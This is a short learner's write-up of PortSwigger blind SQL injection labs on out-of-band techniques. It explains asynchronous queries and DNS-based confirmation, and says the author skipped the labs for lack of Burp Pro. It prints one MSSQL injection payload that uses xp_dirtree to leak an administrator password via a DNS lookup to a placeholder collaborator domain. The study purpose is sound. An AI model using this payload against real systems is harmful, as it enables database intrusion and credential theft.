# Labs 13 & 14 — Blind SQL Injection with Out-of-Band (OAST) Techniques

**Difficulty:** Practitioner  
**Category:** Blind SQL Injection — OAST  
**Platform:** PortSwigger Web Security Academy

---

## What the labs are

These labs cover scenarios where the SQL query runs asynchronously — meaning even time-based techniques don't work because the HTTP response doesn't wait for the query to finish. The only option is out-of-band communication.

---

## The vulnerability

The app fires the SQL query in a separate thread. No errors, no response differences, no timing channel. Instead, we make the database reach out to an external server we control.

---

## How OAST works

You inject a payload that makes the database perform a DNS lookup to a domain you control (Burp Collaborator). When the DB executes the query, it resolves the domain — and you see that DNS request arrive at Collaborator. That's your confirmation.

For data exfiltration (Lab 14), the password is embedded in the subdomain of the DNS request:

```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.your-collaborator-domain.net/a"')--
```

If the password is `s3cure`, the DB looks up `s3cure.your-collaborator-domain.net` — the password arrives in the DNS log.

**Why DNS specifically:** DNS traffic is almost never blocked by firewalls because every system needs it to function. HTTP might be blocked, but DNS gets through basically everywhere.

---

## Why I skipped these labs

Both labs require Burp Collaborator, which is a Burp Suite Pro feature. Community Edition doesn't have it. The "Insert Collaborator payload" option simply doesn't exist in Community.

---

## Key takeaway

OAST is the most powerful blind SQLi technique — it works even when the app is fully async and gives you the full password in a single request rather than hundreds. The tradeoff is needing Burp Pro or a self-hosted OOB server. In real engagements this is often the preferred approach over time-based because it's faster and more reliable.
